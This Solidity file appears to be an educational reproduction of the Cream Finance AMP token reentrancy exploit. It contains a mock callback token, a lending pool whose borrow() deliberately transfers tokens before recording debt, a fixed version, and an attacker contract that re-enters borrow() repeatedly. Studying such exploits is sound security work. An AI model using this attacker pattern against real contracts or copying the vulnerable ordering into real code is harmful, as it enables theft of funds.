// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Cream Finance - AMP Token Reentrancy
 * @notice Simplified version showing the $18.8M exploit
 * 
 * ROOT CAUSE: AMP token has ERC777-style transfer hooks that call back
 * to the recipient. Cream's borrow() transferred tokens before updating
 * debt state, allowing reentrancy through the token callback.
 */

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

// Simulates AMP token with transfer hooks
interface IAMP {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface ITokenReceiver {
    function tokensReceived(address from, uint256 amount) external;
}

contract AMPToken {
    mapping(address => uint256) public balanceOf;
    
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        
        // ERC777-style callback - THIS ENABLES REENTRANCY
        if (isContract(to)) {
            ITokenReceiver(to).tokensReceived(msg.sender, amount);
        }
        return true;
    }
    
    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
    
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract VulnerableCreamPool {
    IAMP public ampToken;
    IERC20 public collateralToken;
    
    mapping(address => uint256) public collateral;
    mapping(address => uint256) public debt;
    
    uint256 public constant COLLATERAL_FACTOR = 75; // 75% LTV
    
    constructor(address _amp, address _collateral) {
        ampToken = IAMP(_amp);
        collateralToken = IERC20(_collateral);
    }
    
    function depositCollateral(uint256 amount) external {
        collateralToken.transferFrom(msg.sender, address(this), amount);
        collateral[msg.sender] += amount;
    }
    
    /**
     * @notice VULNERABLE borrow function
     * @dev Token transfer happens BEFORE debt state update
     */
    function borrow(uint256 amount) external {
        uint256 maxBorrow = collateral[msg.sender] * COLLATERAL_FACTOR / 100;
        require(debt[msg.sender] + amount <= maxBorrow, "Exceeds borrow limit");
        
        // BUG: External call BEFORE state update
        // AMP token's transfer() calls tokensReceived() on recipient
        // Attacker can reenter borrow() before debt is updated
        ampToken.transfer(msg.sender, amount);
        
        // This line doesn't execute until after all reentrancy completes
        debt[msg.sender] += amount;
    }
    
    /**
     * @notice FIXED borrow function using CEI pattern
     */
    function borrowFixed(uint256 amount) external {
        uint256 maxBorrow = collateral[msg.sender] * COLLATERAL_FACTOR / 100;
        require(debt[msg.sender] + amount <= maxBorrow, "Exceeds borrow limit");
        
        // FIXED: Update state BEFORE external call
        debt[msg.sender] += amount;
        
        ampToken.transfer(msg.sender, amount);
    }
}

/**
 * @notice Attacker contract that exploits the reentrancy
 */
contract CreamAttacker is ITokenReceiver {
    VulnerableCreamPool public target;
    uint256 public attackCount;
    uint256 public maxAttacks = 10;
    
    constructor(address _target) {
        target = VulnerableCreamPool(_target);
    }
    
    function attack() external {
        // Start borrowing - will trigger callback
        target.borrow(1 ether);
    }
    
    // Called by AMP token during transfer
    function tokensReceived(address, uint256) external override {
        attackCount++;
        // Keep reentering while we can
        if (attackCount < maxAttacks) {
            target.borrow(1 ether);
        }
    }
}
